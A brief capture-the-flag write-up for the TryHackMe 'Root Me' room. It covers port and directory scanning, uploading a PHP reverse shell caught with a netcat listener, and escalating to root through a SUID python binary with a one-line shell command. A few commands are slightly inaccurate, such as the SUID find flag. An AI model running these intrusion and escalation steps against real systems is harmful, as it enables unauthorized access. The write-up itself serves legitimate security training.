# Root Me TryHackMe

## 2024-01-02, Joakim Oscarsson

## Problem description

### Recon

nmap -sV -oN "output_nmap.txt" 10.10.207.97
22 ssh
80 http

gobuster dir -w /usr/share/wordlists/dirb/big.txt -u 10.10.207.97
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/css                  (Status: 301) [Size: 310] [--> http://10.10.207.97/css/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.207.97/js/]
/panel                (Status: 301) [Size: 312] [--> http://10.10.207.97/panel/]
/server-status        (Status: 403) [Size: 277]
/uploads              (Status: 301) [Size: 314] [--> http://10.10.207.97/uploads/]
Progress: 20469 / 20470 (100.00%)

Using the reverse shell found in /usr/share/webshells/php/php-reverse-shell.php and changing the IP and PORT number.

To connect to the reverse shell we use netcat and the command 
nc -nlvp <portnumber>

then when we are inside a shell, we can make it persistent with
python -c 'import pty; pty.spawn("/bin/bash")'

to find the path to the flag we use this command:
find / -type f -name user.txt 2>/dev/null
which starts from / then looks for regular files with the name user.txt (indicated by task) then if we get the stderr (2) we redirect the message to /dev/null to discard them

SUID files are files that run with the priviledges of the creator of the file instead of the one executing the file.

To find the files with SUID set we run
find / -perm 4000 2> /dev/null

Here we find that python has SUID set and thus we can use gtfobins to escalate privaleges.

we use the command
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

then we can enter the root directory

